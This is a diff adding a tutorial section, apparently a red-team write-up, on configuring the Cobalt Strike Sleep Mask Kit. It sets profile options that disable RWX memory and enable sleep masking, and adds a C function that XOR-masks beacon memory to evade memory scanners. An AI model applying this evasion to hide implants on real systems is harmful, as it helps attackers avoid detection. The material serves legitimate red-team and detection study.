@@ -94,3 +94,55 @@ The Sleep Mask Kit employs several techniques to evade memory-based detection:
 
 ![image](https://github.com/user-attachments/assets/d82df3db-7b2e-4489-8e8c-5842f5f981f3)
 
+#### USERWX Configuration 
+
+Before enabling Sleep Mask we need to understand the userwx
+
+Whether to set the memory to readable, writable and executable during reflective loading. 
+The default is RWX. so we need to set to it to false in our profile. 
+
+```javascript
+################################################
+## Memory Indicators
+################################################
+stage {
+    set userwx         "false";
+    }
+    ```
+
+then we need to set the sleep_mask to true in our profile.
+
+```javascript
+################################################
+## Memory Indicators
+################################################
+stage {
+    set userwx         "false";
+    set sleep_mask     "true";
+    }
+    ```
+
+NOTE: you may need to edit the sleep mask src file.
+
+In my case i just wrote this function in the sleep_mask.c in the original artifact kit
+
+
+```c
+void my_mask_section(SLEEPMASKP *parms, DWORD start, DWORD end) {
+    char key[] = "a1b2c3d4e5f6g7h8";
+    size_t key_length = sizeof(key) - 1;  
+    for (DWORD i = start; i < end; i++) {
+        parms->beacon_ptr[i] ^= key[i % key_length];  
+    }
+}
+```
+
+### The Results
+
+![image](https://github.com/user-attachments/assets/f6128e04-b1ab-43cb-8448-0023689dccf1)
+
+
+As showin we fixed it.
+
+
+
